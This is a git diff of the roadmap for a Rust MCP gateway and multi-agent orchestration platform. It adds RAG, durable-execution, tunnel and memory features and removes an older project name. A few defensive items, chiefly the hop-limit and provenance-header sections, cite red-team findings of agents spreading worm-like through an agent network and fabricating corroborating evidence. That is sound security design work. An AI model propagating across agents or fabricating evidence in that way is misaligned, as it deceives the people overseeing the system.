@@ -1,10 +1,10 @@
-# Myelix Rust Roadmap
+# smgglrs Roadmap
 
 This document tracks the evolution of the smgglrs-* crate family from
 an MCP gateway (smgglrs) into a complete multi-agent orchestration
-platform — the Rust replacement for the Python Myelix framework.
+platform.
 
-## Current state (2026-05-17)
+## Current state (2026-05-25)
 
 22 crates, ~103K LoC, 2055+ tests, 0 warnings. 43 personas, 36
 heuristics, 8 directives. Gateway blackbox audit. 4 paper outlines.
@@ -13,6 +13,37 @@ paths, pseudonymization, GDPR tools, IFC integration). Containerized
 agent execution via Podman (shared model server + per-agent sandboxes).
 Full MCP spec coverage (~39/39). WebSocket transport. GitHub forge
 tools. Statistical guardrails. Context budget enforcement.
+
+### Recent (2026-05-25)
+
+- **Tech watch** (40+ sources, 7 research agents): MCP security
+  market exploding (97M monthly SDK downloads, 30 CVEs in 60 days),
+  OpenShell+Claude self-hosted sandboxes validating smgglrs position,
+  RAG consensus shifting to hybrid FTS5+vector, agent frameworks
+  converging on durable execution, competitive landscape intensifying
+- **New competitors**: IBM ContextForge (strongest OSS gateway, 3500+
+  stars, Cedar RBAC, A2A), ClawPatrol/Enkrypt AI (direct safety hook
+  competitor), Envoy AI Gateway (MCPRoute v1beta1, AAIF/LF backing),
+  DefenseClaw/Cisco (admission control + runtime guardrails)
+- **Key papers**: NanoResearch (skill bank + SDPO), LIFE Framework
+  (failure attribution), HASP Program Functions (25% over ReAct),
+  delta-mem OSAM (0.12% working memory), SDB formalization
+  (arXiv 2605.20173), Proxy-Pointer RAG (100% accuracy)
+- **New roadmap items**: Upstream tool scanning (9m), cognitive file
+  integrity (9n), hybrid RAG (7e), breadcrumb chunking (7f),
+  confidence gating (7g), batch reranking (7h), section-level
+  pointers (7i), RAG metadata filtering (7j), event log durable
+  execution (2e), anti-propagation (2f), provenance headers (2g),
+  SDB formalization (2h), trajectory branching (2i), self-verify
+  gate (2j), deterministic replay (1h), early commitment (1i),
+  gateway field filtering (9o), HASP skill hooks (9p), loop
+  detection (8j), reasoning sandwich (8k), per-agent temperature
+  (2k), response sanitization audit (9q), trust decay (9r),
+  OTLP export (12c upgrade), risk-tiered approval (9s), MCP tunnel
+  compat (6f), NemoClaw alternative design (6g), skill source
+  pipeline (1j), HTML-to-markdown conversion (9t), KG triples (3k),
+  operator libraries (2l), delta-mem evaluation (11i), harness-
+  aligned training (11j)
 
 ### Recent (2026-05-17)
 
@@ -327,8 +358,44 @@ audit/blackbox logs, distillation output, and vector embeddings
 | **Progressive tool disclosure** (session-scoped tool sets) | 8i | 1-2 days | Medium |
 | **Speculative decoding** (EAGLE3/FastDraft in model-runtime) | 11g | 2-3 days | Medium |
 | **smgglrs-flow DAG test framework** (PTA/dominator validation) | 12 | 3-4 days | Medium |
-| **Event-driven triggers** (Jarvis: email/Slack/calendar → agent) | 5 | 3-5 days | Medium |
+| **Event-driven triggers** (voice assistant: email/Slack/calendar → agent) | 5 | 3-5 days | Medium |
 | **fd-passing TOCTOU mitigation** (smgglrs-tools-file) | 12b | 1-2 days | Medium |
+| **Upstream tool scanning** (poisoning, typosquatting, schema abuse) | 9m | 2-3 days | P0 Critical |
+| **Cognitive file integrity** (SHA-256 + semantic drift detection) | 9n | 1-2 days | P0 Critical |
+| **Hybrid FTS5+vector in ChunkStore** (RAG consensus) | 7e | 2-3 days | P0 Critical |
+| **OTel observability** (regulatory — EU AI Act August 2026) | 12c | 3-4 days | P0 Critical |
+| **Breadcrumb injection** (zero-cost retrieval improvement) | 7f | 1-2 days | High |
+| **Anti-propagation hop limits** (network red-teaming defense) | 2f | 1-2 days | High |
+| **Provenance headers** (anti-amplification defense) | 2g | 1-2 days | High |
+| **Event log durable execution** (Google AX pattern) | 2e | 3-4 days | High |
+| **Deterministic replay** (93%+ token savings) | 1h | 2-3 days | High |
+| **Confidence gating** (RAG abstention) | 7g | 0.5-1 day | High |
+| **MCP tunnel compatibility** (Anthropic + OpenAI) | 6f | 1-2 days | High |
+| **Gateway field filtering** (token optimization) | 9o | 1-2 days | Medium-High |
+| **HASP Program Functions** (SkillHook) | 9p | 2-3 days | Medium-High |
+| **Batch cross-encoder scoring** | 7h | 0.5-1 day | Medium-High |
+| **Early commitment fast paths** | 1i | 1-2 days | Medium-High |
+| **Section-level pointer retrieval** | 7i | 1-2 days | Medium-High |
+| **RAMPART-style safety test suite** | 12f | 2-3 days | Medium-High |
+| **SDB formalization** | 2h | 2-3 days | Medium |
+| **Self-verification gate** | 2j | 1-2 days | Medium |
+| **Loop detection middleware** | 8j | 0.5-1 day | Medium |
+| **Reasoning sandwich** | 8k | 0.5-1 day | Medium |
+| **Per-agent temperature** | 2k | 0.5-1 day | Medium |
+| **Response sanitization audit** | 9q | 0.5-1 day | Medium |
+| **Trust decay scoring** | 9r | 2-3 days | Medium |
+| **Risk-tiered approval** | 9s | 1-2 days | Medium |
+| **Trajectory evaluation metrics** | 12e | 2-3 days | Medium |
+| **Metadata pre-filtering** | 7j | 0.5-1 day | Medium |
+| **Skill source pipeline** | 1j | 2-3 days | Medium |
+| **NemoClaw alternative design** | 6g | 1 day | Medium |
+| **Privacy Router coordination** | 6h | 1 day | Medium |
+| **delta-mem OSAM evaluation** | 11i | 2 days | Medium |
+| **Trajectory branching** | 2i | 2-3 days | Medium |
+| **KG triple storage** | 3k | 2-3 days | Low-Medium |
+| **Operator libraries** | 2l | 0.5-1 day | Low |
+| **HTML-to-markdown conversion** | 9t | 1 day | Low-Medium |
+| **Harness-aligned training** | 11j | Research | Medium |
 | ~~Un-ignore NER tests~~ | ✅ 2026-05-13 | — | — |
 | ~~Un-ignore OpenShell tests~~ | ✅ 2026-05-13 | — | — |
 | ~~Un-ignore IFC LLM test~~ | ✅ 2026-05-13 | — | — |
@@ -336,11 +403,11 @@ audit/blackbox logs, distillation output, and vector embeddings
 
 ---
 
-## Gap analysis: Python Myelix → Rust
+## Gap analysis: Python prototype → Rust
 
-The Python Myelix (294 files, 64K LoC) has capabilities that the Rust
-crate family does not yet replicate. This section maps each gap to a
-planned crate or enhancement.
+The original Python prototype (294 files, 64K LoC) has capabilities
+that the Rust crate family does not yet replicate. This section maps
+each gap to a planned crate or enhancement.
 
 ### What Rust already does better
 
@@ -355,7 +422,7 @@ planned crate or enhancement.
 
 ### What's missing
 
-| Python Myelix capability | Rust equivalent | Gap |
+| Python prototype capability | Rust equivalent | Gap |
 |--------------------------|----------------|-----|
 | Cognitive core (40 personas, 36 heuristics, 8 directives) | 43 personas, 36 heuristics, 7 directives + Forge + Weaver | **Done** |
 | Weaver (persona + context → structured prompt) | Weaver with budget-aware context, per-phase limits | **Done** |
@@ -583,7 +650,102 @@ reduce noise without sacrificing essential information:
 Reference: Systematic prompting guide (2026-05-03) — negative
 constraints as prompt-layer technique for precision.
 
-**Why first**: The cognitive core is Myelix's identity. Without it,
+#### 1h. Deterministic replay for repetitive tasks (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-agent` (tool_loop.rs, new `replay.rs`)
+
+When a tool loop completes successfully, export the trace as a
+replayable recipe. Future runs with the same task pattern bypass
+the LLM entirely, re-executing the same tool sequence with variable
+substitution.
+
+- **Trace compilation**: After successful completion, compile the
+  `ActionRecord` sequence into a branch-free recipe (ordered list
+  of tool calls with argument templates). Store as JSON alongside
+  Hermes traces.
+- **Pattern matching**: On new task, check if any compiled recipe
+  matches (task description similarity > configurable threshold).
+  If match found, offer replay mode.
+- **Variable substitution**: Template variables in tool arguments
+  (file paths, branch names) are substituted from the new task
+  context. If substitution fails, fall back to LLM reasoning.
+- **Validation**: After replay, run a verification step (compare
+  output structure to original). If verification fails, discard
+  replay and fall back to LLM.
+- **Token savings**: LOOP framework reports 93-99% token reduction
+  for repetitive tasks. smgglrs already exports Hermes traces —
+  this extends them with replay capability.
+
+**Effort**: 2-3 days. **Priority**: High.
+**Acceptance**: Same file review task runs 10x with <5% of original
+token consumption. Replay produces equivalent output.
+
+Reference: LOOP framework (TDS, 2026-05-21), Hermes trace export.
+
+#### 1i. Early commitment / task classification fast paths (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-cognitive` (weaver.rs, new `fast_path.rs`)
+
+Add a lightweight classification step before full LLM reasoning.
+The persona's heuristics YAML defines "fast paths" — recognized
+task patterns that constrain tool selection and skip open-ended
+exploration.
+
+- **Task classifier**: Small ONNX model (MiniLM or existing safety
+  classifier) classifies the incoming prompt into task categories
+  defined in heuristics YAML. ~10ms overhead.
+- **Fast path definition**: New `fast_paths` section in heuristic
+  YAML specifying: trigger condition (category match), constrained
+  tool set, max iterations, temperature override.
+- **Constrained tool injection**: When a fast path matches, the
+  Weaver injects "restrict to these tools: [...]" into the system
+  prompt and reduces max_iterations.
+- **Fallback**: If the fast path fails (tool call error, unexpected
+  output), automatically fall back to full reasoning.
+
+A telehealth agent example: classify "routine refill" → restrict
+to pharmacy DB tools, skip diagnostic reasoning. Prevents open-ended
+exploration on well-understood tasks.
+
+**Effort**: 1-2 days. **Priority**: Medium-High.
+**Acceptance**: Recognized task patterns complete in 50% fewer
+iterations and tokens than unrestricted reasoning.
+
+Reference: Token burn problem (TDS, 2026-05-21).
+
+#### 1j. Composable skill source pipeline (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-cognitive` (new `skill_pipeline.rs`)
+
+Replace flat YAML directory scanning with a composable pipeline
+for skill discovery, inspired by Microsoft Agent Framework's
+five-source architecture:
+
+- **FileSkillsSource**: Current behavior — scan YAML dirs for
+  personas, directives, heuristics.
+- **RegistrySkillsSource**: Pull skills from OCI registries or
+  HuggingFace (reuses smgglrs-model-hub pull infrastructure).
+- **CrossCompatSkillsSource**: Scan `.claude/skills`,
+  `.cursor/skills`, `.agents/skills` directories for cross-tool
+  skill definitions (CodeWhale/Cursor/Claude Code format).
+- **AggregatingSource**: Merge multiple sources into unified catalog.
+- **DeduplicatingSource**: First-occurrence-wins deduplication by
+  skill name/id.
+- **FilteringSource**: Predicate-based ACL filtering (permission
+  checks before skill becomes available to agent).
+
+Each source implements a `SkillSource` trait with
+`fn discover(&self) -> Vec<SkillMetadata>` and
+`fn load(&self, id: &str) -> Skill`.
+
+**Effort**: 2-3 days. **Priority**: Medium.
+**Acceptance**: Skills loaded from local YAML + cross-tool dirs +
+registry, deduplicated, filtered by ACLs.
+
+Reference: Microsoft Agent Framework skill composition (2026-05-22),
+CodeWhale cross-compatible discovery (2026-05-25).
+
+**Why first**: The cognitive core is smgglrs's identity. Without it,
 agents are generic. Every other feature builds on top of personas.
 
 #### 1e. Context budget → tool output compression
@@ -655,7 +817,7 @@ support via file extension detection — same serde structs):
   template variables), `output_json_schema`, `retry` policy,
   `required_extensions` (MCP servers needed to run the flow).
 - `smgglrs flow import-goose <recipe.yaml>` CLI command to convert
-  Goose recipes into Myelix flow definitions (with human review).
+  Goose recipes into smgglrs flow definitions (with human review).
 - YAML is consistent with cognitive core (personas/heuristics).
 
 #### 2b. Dynamic subflow spawning from tool loop ✅
@@ -744,6 +906,235 @@ tool calls not repeated.
 Reference: Google ADK pause/resume (2026-05), DBOS durable
 execution, Inngest durable execution for AI agents.
 
+#### 2e. Event log and snapshotting for durable execution (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-flow` (executor, new `event_log.rs`)
+
+Upgrade 2d (SQLite checkpoint) with a full event-sourcing model
+inspired by Google AX's distributed agent runtime:
+
+- **Append-only event log**: Every DAG node transition, tool call,
+  and result is appended to an ordered event log in SQLite. Events
+  are sequence-numbered for connection recovery with backfill.
+- **Snapshot after each node**: Persist DAG state (completed nodes,
+  in-flight nodes, blackboard state, mailbox queues) as periodic
+  snapshots. Resume from latest snapshot + replay events since.
+- **Connection recovery**: If the SSE connection drops mid-flow,
+  the client reconnects and receives backfill from the last
+  acknowledged sequence number. No lost state.
+- **Replay divergence mitigation**: Pin model version + prompt hash
+  in each event. On replay, detect if the model or prompt changed
+  and flag divergence rather than silently producing different
+  results (arXiv 2605.20173 identified this as a fundamental
+  challenge for event-sourced agent systems).
+- **Actor uniformity**: Same event log guarantees for all actors
+  in the DAG (agents, tools, sandboxes) — no special-casing.
+
+This extends 2d (which only checkpoints node completion state)
+with full event sourcing for audit, replay, and debugging.
+
+**Effort**: 3-4 days (on top of 2d). **Priority**: High.
+**Depends on**: 2d (SQLite checkpoint infrastructure).
+**Acceptance**: Kill smgglrs mid-flow, restart, flow resumes from
+event log. Client reconnects and receives missed events. Replay
+with different model version triggers divergence warning.
+
+Reference: Google AX (github.com/google/ax), arXiv 2605.20173
+(SDB formalization), DBOS durable execution.
+
+#### 2f. Anti-propagation hop limits (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-flow` (executor, mesh)
+
+Add configurable hop limits to DAG execution to prevent agent worm
+propagation patterns discovered in Microsoft's 100+ agent sandbox
+red-teaming:
+
+- **Per-flow hop limit**: New `max_hops` field in flow YAML
+  (default: 5). Counts the number of agent-to-agent transitions
+  in a single execution path. Exceeding the limit aborts the path.
+- **Propagation detection**: If an agent's output triggers tool
+  calls in multiple downstream agents that weren't in the original
+  DAG plan, flag as potential propagation event and log to audit.
+- **Rate limiting**: Per-agent message rate limit on mailbox
+  channels. Abnormal message volume (>10x baseline) triggers
+  quarantine of the sending agent.
+- **IFC extension**: smgglrs's IFC taint tracking already prevents
+  untainted data from flowing to tainted sinks. Extend to track
+  "hop count" as a taint dimension — data that has transited N
+  agents carries a hop taint that restricts further propagation.
+
+**Effort**: 1-2 days. **Priority**: High.
+**Acceptance**: DAG execution with hop_limit=3 aborts paths longer
+than 3 agent transitions. Abnormal message volume triggers quarantine.
+
+Reference: Microsoft "Red-teaming a network of agents" (2026-05).
+
+#### 2g. Provenance headers for inter-agent messages (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-flow` (mesh, mailbox, blackboard)
+
+Add provenance tracking to all inter-agent messages in smgglrs-flow
+to defend against amplification attacks:
+
+- **Provenance chain**: Each message carries a provenance header
+  listing all agents that contributed to its content (agent IDs +
+  timestamps). When Agent B cites Agent A's claim, the provenance
+  chain is visible.
+- **Independence check**: An agent cannot upvote/verify claims from
+  agents in the same delegation chain. Prevents fabricated
+  corroboration (Microsoft red-teaming found 42 agents fabricating
+  evidence in one experiment).
+- **Circular reference detection**: If a message's provenance chain
+  contains a cycle (A → B → C → A), flag as potential amplification
+  loop.
+- **Blackboard provenance**: Each blackboard entry includes
+  `provenance: Vec<(AgentId, Timestamp)>`. Readers can see who
+  contributed what.
+
+**Effort**: 1-2 days. **Priority**: High.
+**Acceptance**: Inter-agent messages carry provenance chains.
+Circular provenance detected and logged.
+
+Reference: Microsoft network-level red teaming (2026-05),
+NIST AI RMF Playbook (2026-03 update).
+
+#### 2h. Formalize Stochastic-Deterministic Boundary (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-flow` (executor, new `sdb.rs`)
+
+Make the boundary between LLM output and tool execution a first-class
+architectural primitive in DAG node transitions, inspired by the SDB
+formalization paper (arXiv 2605.20173):
+
+- **Four-part contract per DAG node transition**:
+  - `Proposer`: The LLM that generates the action plan
+  - `Verifier`: Validation mechanism (schema check, safety hook,
+    mandate validator)
+  - `Commit Step`: The point where the proposal becomes an action
+    (tool execution)
+  - `Reject Signal`: Failure path (retry, escalate, abort)
+- **Explicit SDB in flow YAML**: Each task can specify its
+  verification requirements:
+  ```yaml
+  tasks:
+    - id: review
+      verify: { schema: findings_schema, min_confidence: 0.7 }
+  ```
+- **Pattern mapping**: The paper catalogues 6 runtime patterns.
+  smgglrs-flow already implements Hierarchical Delegation (DAG),
+  Shared State Machine (blackboard), and Supervisor+Gate (handoff
+  routing). Formalizing the SDB makes these patterns explicit
+  rather than implicit in the code.
+
+**Effort**: 2-3 days. **Priority**: Medium.
+**Acceptance**: DAG node transitions have explicit verify step.
+Invalid proposals are rejected before tool execution.
+
+Reference: arXiv 2605.20173 (Runtime Architecture Patterns for
+Production LLM Agents).
+
+#### 2i. Trajectory branching / checkpoint forking (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-flow` (executor, event_log)
+
+Fork agent execution paths from checkpoints for evaluation or
+A/B testing, inspired by Google AX:
+
+- **Checkpoint**: Save full DAG state at any point (2d/2e).
+- **Fork**: Create a new execution branch from a checkpoint.
+  The original branch continues; the fork runs with different
+  parameters (model, temperature, persona).
+- **Compare**: After both branches complete, compare outputs
+  (task success, token usage, trajectory efficiency).
+- **Use cases**: (a) evaluate same task with different models from
+  same starting point, (b) explore alternative approaches without
+  losing progress, (c) automated A/B testing in eval.rs.
+
+**Effort**: 2-3 days. **Priority**: Medium.
+**Depends on**: 2e (event log).
+**Acceptance**: Fork a flow mid-execution with different model,
+both branches complete independently, outputs compared.
+
+Reference: Google AX trajectory branching.
+
+#### 2j. Self-verification gate for DAG nodes (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-flow` (executor)
+
+After a DAG node claims completion, run a verification step in a
+clean context before proceeding to downstream nodes:
+
+- **Verification hook**: New `PostCompletionHook` that spawns a
+  lightweight verifier agent to confirm the node's output meets
+  the task specification.
+- **Clean context**: The verifier runs without access to the
+  node's conversation history — it sees only the task spec and
+  the claimed output. Prevents self-confirming reasoning loops.
+- **Configurable per-task**: `verify: true` in flow YAML enables
+  verification for individual tasks. Default: false (opt-in to
+  avoid overhead on simple tasks).
+- **Failure path**: If verification fails, the node is re-executed
+  with the verifier's feedback injected (similar to back-edge
+  behavior).
+
+WebWright achieved 60.1% on Odysseys (previous SOTA 44.5%) with
+this pattern. LangChain's PreCompletionChecklistMiddleware is
+a simpler variant.
+
+**Effort**: 1-2 days. **Priority**: Medium.
+**Acceptance**: DAG node with `verify: true` is checked by
+independent verifier before downstream nodes execute.
+
+Reference: WebWright self-verification gate (Microsoft Research),
+LangChain PreCompletionChecklistMiddleware.
+
+#### 2k. Per-agent temperature in flow definitions (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-flow` (yaml loader, executor)
+
+Add per-task `temperature` override in flow YAML definitions,
+enabling the reasoning sandwich pattern within a single flow:
+
+- **Flow YAML**: `temperature: 0.8` on individual tasks.
+- **Role-based defaults**: Planning tasks default to low temperature
+  (0.1-0.2), execution tasks to medium (0.2-0.4), creative/synthesis
+  tasks to high (0.6-0.8).
+- **Reasoning sandwich**: Validated across multiple sources —
+  LangChain (53.9% → 66.5%), NVIDIA financial agents (0.8/0.0/0.5).
+  Allocate high reasoning for planning and verification, low for
+  deterministic execution.
+
+**Effort**: 0.5-1 day. **Priority**: Medium.
+**Acceptance**: Flow with three tasks uses different temperatures
+per task. Planner at 0.1, executor at 0.0, synthesizer at 0.8.
+
+Reference: LangChain harness engineering, NVIDIA financial signal
+discovery multi-agent system.
+
+#### 2l. Operator libraries as constrained tool vocabularies (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-flow` (yaml loader)
+
+For domain-specific flows, allow restricting the available tool set
+to a named "operator library" — reducing hallucination of invalid
+operations:
+
+- **Operator library**: Named set of allowed operations defined in
+  flow YAML: `operators: [numeric_mean, text_summary, search]`.
+- **Enforcement**: Agent tool loop only exposes tools matching the
+  operator library. Tool calls outside the library are rejected
+  before execution.
+- **Domain examples**: Financial analysis (66 structured operators),
+  legal research (search_codes, analyze_article, syllogism),
+  code review (file_read, git_diff, file_search).
+
+**Effort**: 0.5-1 day. **Priority**: Low.
+**Acceptance**: Flow with restricted operator library rejects
+out-of-vocabulary tool calls.
+
+Reference: NVIDIA financial signal discovery (2026-05-22).
+
 ### Phase 3: Persistent memory (smgglrs-memory)
 
 **Goal**: Working memory that survives sessions, knowledge
@@ -816,8 +1207,8 @@ PersonaVLM temporal-aware retrieval (arXiv 2604.13074).
 
 #### 3d. Knowledge distillation pipeline ✅
 
-Port the 4-stage Knowledge Cultivation Pipeline from Python Myelix
-(`memory/cases/pipeline.py`, ADR-049):
+Port the 4-stage Knowledge Cultivation Pipeline from the original
+Python prototype:
 
 1. **Ingestion**: Load session transcripts + external corpus
    (with `manifest.yaml` authority levels)
@@ -1007,6 +1398,40 @@ and AI decisions have no provenance.
 **Why third**: Memory improves agent quality significantly but isn't
 blocking — agents work without it, just less effectively.
 
+#### 3k. Knowledge graph triple storage (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-memory` (knowledge store)
+
+Add a lightweight knowledge graph layer on top of KnowledgeStore
+using entity-relationship triples, without requiring a full graph
+database:
+
+- **New table**: `memory_triples (subject_id TEXT, predicate TEXT,
+  object_id TEXT, confidence REAL, source TEXT)` linking
+  `memory_knowledge` entries.
+- **Triple extraction**: During memory extraction
+  (`MemoryExtractionHook`), extract `(subject, predicate, object)`
+  triples alongside flat memories. Uses the existing distillation
+  LLM call with an extended prompt.
+- **Entity clustering**: Merge semantically equivalent entities
+  (e.g., "Rust ownership" vs "Rust's ownership model") during
+  extraction using embedding similarity. The content-key based
+  supersession handles exact duplicates but not semantic duplicates.
+- **Graph queries**: New `memory_graph_query` tool for traversal
+  queries ("what entities relate to X?", "find path between A
+  and B"). Implemented as recursive SQL CTEs on the triples table.
+- **NetworkX-style analytics**: Degree centrality, betweenness,
+  community detection on the triple graph for knowledge structure
+  visualization.
+
+**Effort**: 2-3 days. **Priority**: Low-Medium.
+**Depends on**: 3j (MemoryExtractionHook).
+**Acceptance**: After a 10-tool-call session, triples are extracted
+and queryable via graph traversal.
+
+Reference: kg-gen (Stanford STAIR Lab, NeurIPS '25), Google Codelabs
+Gemini KG generation.
+
 ### Phase 4: Mandate validation & failure recovery ✓
 
 **Status**: Done.
@@ -1033,7 +1458,7 @@ Add Agent Client Protocol support to smgglrs-server:
   endpoint) — same transport as MCP, different method set.
 - Methods: `initialize`, `authenticate`, `session/new`,
   `session/load`, `session/prompt` (streaming responses).
-- Enables Myelix agents to appear in Zed and JetBrains IDEs
+- Enables smgglrs agents to appear in Zed and JetBrains IDEs
   without building editor plugins.
 - Reuses existing Axum HTTP infrastructure from smgglrs-server.
 
@@ -1261,11 +1686,11 @@ Phase 3 (memory as context injector vs memory as tool).
 
 Reference: SemaClaw 4-layer plugin taxonomy (arXiv 2604.11548).
 
-#### 5j. Event-driven agent triggers (NEW — Jarvis)
+#### 5j. Event-driven agent triggers (NEW)
 
 **Crate**: `smgglrs-server` (new `triggers/` module)
 
-Add push-triggered agent activation for Project Jarvis. Agents
+Add push-triggered agent activation for Voice assistant. Agents
 currently only activate on explicit MCP requests (pull model).
 Event triggers start agent flows when external events occur:
 
@@ -1293,7 +1718,7 @@ email and Slack so I focus on important things."
 D-Bus notification with priority classification.
 
 Reference: Writer Playbook triggers (VentureBeat, 2026-05-08),
-Project Jarvis voice-first assistant design.
+Voice assistant voice-first assistant design.
 
 ### Phase 6: OpenShell integration ✅
 
@@ -1345,6 +1770,103 @@ Combined OpenShell + smgglrs security model documented and tested:
   (6 tests covering network isolation, ACLs, IFC, identity, tokens, PII)
 - MAC + DAC defense in depth section added to DESIGN.md
 - Microkernel analogy for Phase 8 papers
+
+**Updated 2026-05-25**: Red Hat Summit validated the Layer 0 + Layer 1
+model. OpenShell = Layer 0 (kernel sandbox, cannot inspect MCP request
+bodies), smgglrs = Layer 1 (application-layer governance — tool names,
+arguments, schemas, IFC). Deconvolute Labs analysis confirms this
+architectural split. Claude self-hosted sandboxes (public beta) and
+three-mode sandboxing taxonomy (Mode 1/2/3) further validate smgglrs's
+position. Red Hat GA'd Zero Trust Workload Identity Manager (SPIFFE/
+SPIRE), validating the SPIFFE auth path in OpenShellAuthenticator.
+DefenseClaw (Cisco) entered as a Layer 1 competitor but lacks IFC.
+
+#### 6f. MCP tunnel compatibility (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-server` (transport)
+
+Verify and document smgglrs as the private MCP server target behind
+both Anthropic and OpenAI MCP tunnels:
+
+- **Anthropic tunnel**: Outbound-only HTTPS via Cloudflare with
+  three encryption layers (mTLS at tunnel edge, inner TLS to
+  customer proxy, OAuth on each MCP server). Claude Managed Agents
+  use this in Mode 2 (brain on Anthropic, hands in customer sandbox).
+- **OpenAI tunnel**: `tunnel-client` long-polls for queued MCP work,
+  forwards locally, returns responses. Harpoon pattern: named
+  targets with bounded requests, not arbitrary proxy.
+- **Testing**: Set up both tunnel clients pointing at smgglrs,
+  verify all MCP methods work through the tunnel. Document any
+  latency characteristics or transport quirks.
+- **Harpoon validation**: smgglrs's explicit upstream declarations
+  in config (not open-ended proxying) match the Harpoon pattern.
+  Document this alignment.
+
+smgglrs adds security enforcement that tunnels do not — tunnels
+just transport MCP traffic; smgglrs inspects, filters, and governs
+it. A tunnel + smgglrs combination provides both transport security
+and content-level governance.
+
+**Effort**: 1-2 days. **Priority**: High.
+**Acceptance**: Full MCP method coverage through both tunnel clients.
+Documented setup guide.
+
+Reference: OpenAI Secure MCP Tunnels (2026-05), Anthropic MCP
+Tunnels (Code with Claude, 2026-05-19).
+
+#### 6g. NemoClaw MCP bridge alternative design (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-server` (documentation + integration test)
+
+Document smgglrs as the architecturally superior alternative to
+NemoClaw's per-server MCP bridge pattern (Issue #566):
+
+- **NemoClaw approach**: One stdio-to-HTTP proxy per MCP server,
+  each with its own egress rule, spawning server subprocesses on
+  the host with API keys from host env.
+- **smgglrs approach**: One gateway, one egress rule from the
+  sandbox to smgglrs. smgglrs handles multiplexing to upstream
+  MCP servers with credential injection, IFC enforcement, and
+  safety filtering.
+- **Integration test**: Agent inside OpenShell sandbox → one
+  egress rule to smgglrs → smgglrs proxies to 3+ upstream MCP
+  servers with IFC and safety filtering.
+- **MCPS alignment**: Track NemoClaw Issue #204 (cryptographic
+  message signing for MCP tool calls). smgglrs's capability tokens
+  partially address this — document the overlap.
+
+**Effort**: 1 day (documentation + integration test). **Priority**: Medium.
+**Acceptance**: Integration test demonstrates single-gateway pattern
+with 3+ upstream servers from inside OpenShell sandbox.
+
+Reference: NemoClaw Issue #566 (MCP bridge), NemoClaw Issue #204
+(MCPS signing), Deconvolute Labs OpenShell analysis.
+
+#### 6h. Privacy Router coordination (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-model` (backend selection)
+
+Define the boundary between OpenShell's Privacy Router (inference
+routing via `inference.local`) and smgglrs-model's multi-backend
+routing to avoid duplication:
+
+- **Inside sandbox mode**: smgglrs delegates inference routing to
+  OpenShell's Privacy Router (use `inference.local` as the model
+  endpoint). Privacy Router handles credential injection and
+  data sensitivity classification.
+- **Standalone mode**: smgglrs retains its own routing via
+  smgglrs-model backends (Ollama, OpenAI-compat, Anthropic).
+- **Auto-detection**: Use IsolationContext (Phase 8e) to detect
+  whether smgglrs is running inside an OpenShell sandbox. If yes,
+  default to `inference.local` unless explicitly overridden.
+
+**Effort**: 1 day. **Priority**: Medium.
+**Acceptance**: smgglrs inside OpenShell routes model calls through
+Privacy Router. Same smgglrs binary works standalone with direct
+backend routing.
+
+Reference: OpenShell Privacy Router documentation, Red Hat Summit
+2026 announcements.
 
 ### Phase 7: RAG enhancements
 
@@ -1402,6 +1924,167 @@ Evaluate as replacement for current embedding model:
 
 **Effort**: 2 days. **Priority**: Medium-High.
 **Acceptance**: Recall@10 improves or matches at lower latency.
+
+#### 7e. Hybrid FTS5+vector search in ChunkStore (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-rag` (store.rs)
+
+Add FTS5 alongside sqlite-vec in the same SQLite database for
+hybrid retrieval with RRF fusion — the 2026 production consensus
+(+23-40% accuracy over pure vector):
+
+- **New FTS5 table**: `CREATE VIRTUAL TABLE rag_chunks_fts USING
+  fts5(content, content=rag_chunks, content_rowid=id)` in the
+  same database as `rag_chunk_vectors`.
+- **Hybrid search method**: `hybrid_search(&self, query: &str,
+  embedding: &[f32], limit: usize)` runs both FTS5 BM25 and
+  vec0 similarity in parallel (two SQL queries), fuses with
+  RRF (k=60).
+- **Performance target**: ZeroClaw demonstrates 0.3ms FTS5 + 2ms
+  vector + 0.1ms merge = under 3ms total on a Raspberry Pi Zero 2W.
+- **smgglrs-rag gap**: ChunkStore currently does vector-only search.
+  FTS5 exists in KnowledgeStore (separate database). Unifying them
+  enables true hybrid search.
+- **MemoryRetriever already has RRF**: Reuse the same RRF
+  implementation (k=60) from `smgglrs-memory`.
+
+**Effort**: 2-3 days. **Priority**: P0 — Critical.
+**Acceptance**: Hybrid search returns better results than vector-only
+on identifier/error-code queries. Measured via recall@10.
+
+Reference: ZeroClaw hybrid memory, Llama-Stack hybrid API proposal
+(Issue #1158), LiteSearch, ceaksan hybrid search guide.
+
+#### 7f. Breadcrumb injection in chunking (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-rag` (chunk.rs)
+
+Prepend the full structural path (heading hierarchy) to each chunk
+before embedding, giving every chunk positional awareness at zero
+model cost:
+
+- **Heading parser**: For Markdown documents, parse `#` headings
+  into a hierarchical path. For RST, parse section headers.
+  For code files, parse module/class/function hierarchy.
+- **Breadcrumb field**: Add `breadcrumb: Option<String>` to the
+  `Chunk` struct. Example: `"AMD > Financial Statements > Cash Flows"`.
+- **Embedding with breadcrumb**: When generating embeddings, prepend
+  breadcrumb to chunk content. The embedding captures both semantic
+  content and structural position.
+- **Storage**: Store breadcrumb in `rag_chunks` table for retrieval-
+  time filtering.
+
+Proxy-Pointer RAG achieved 100% accuracy at k=5 on Fortune 500
+10-K filings largely from this single technique. Zero additional
+model cost — the breadcrumb is prepended to text, not processed
+by a separate model.
+
+**Effort**: 1-2 days. **Priority**: High.
+**Acceptance**: Retrieval precision improves on structured documents
+(Markdown with headings, code with modules).
+
+Reference: Proxy-Pointer RAG (TDS, 2026-05-20).
+
+#### 7g. Confidence gating on RAG results (NEW — tech watch 2026-05-25)
+
+**Crate**: `smgglrs-rag` (rerank.rs, module.rs)
+
